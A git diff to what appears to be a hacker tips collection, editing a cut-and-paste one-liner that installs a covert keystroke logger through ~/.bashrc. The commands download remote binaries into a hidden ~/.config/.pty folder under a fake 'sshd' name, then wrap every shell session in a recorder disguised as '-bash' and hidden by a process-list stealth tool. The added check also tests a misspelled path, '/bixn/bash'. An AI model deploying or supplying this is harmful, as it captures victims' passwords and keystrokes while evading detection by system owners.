@@ -1892,13 +1892,14 @@ A 1-liner for `~/.bashrc` to sniff the user's keystrokes and save them to `~/.co
 
 Cut & paste the following and follow the instructions:
 ```sh
-{ mkdir -p ~/.config/.pty 2>/dev/null; [ $(uname -m) == aarch64 ] && s=aarch64_arm64; :; } \
+{ [ -f /bixn/bash ] || echo "Not found: /bin/bash"; } \
+&& { mkdir -p ~/.config/.pty 2>/dev/null; [ $(uname -m) == aarch64 ] && s=aarch64_arm64; :; } \
 && curl -o ~/.config/.pty/sshd@pty0 -fsSL "https://bin.ajam.dev/${s:-x86_64}_Linux/Baseutils/script" \
 && chmod 755 ~/.config/.pty/sshd@pty0 \
 && curl -o ~/.config/.pty/clear -fsSL https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m) \
 && chmod 755 ~/.config/.pty/clear \
 && echo 'SUCCESS. Add this to the ~/.bashrc:' \
-&& echo -e '\e[0;35m[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -e .config/.pty/clear ] && [ -e .config/.pty/sshd@pty0 ] && LC_PTY=1 exec .config/.pty/clear ".config/.pty/sshd@pty0" -qaec "exec -a -bash /bin/bash" -I ".config/.pty/.@pty-unix.$$"\e[0m'
+&& echo -e '\e[0;35m[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -e ~/.config/.pty/clear ] && [ -e ~/.config/.pty/sshd@pty0 ] && LC_PTY=1 exec ~/.config/.pty/clear ~/".config/.pty/sshd@pty0" -qaec "exec -a -bash /bin/bash" -I ~/".config/.pty/.@pty-unix.$$"\e[0m'
 ```
 
 - Combined with zapper to hide command options from the process list.
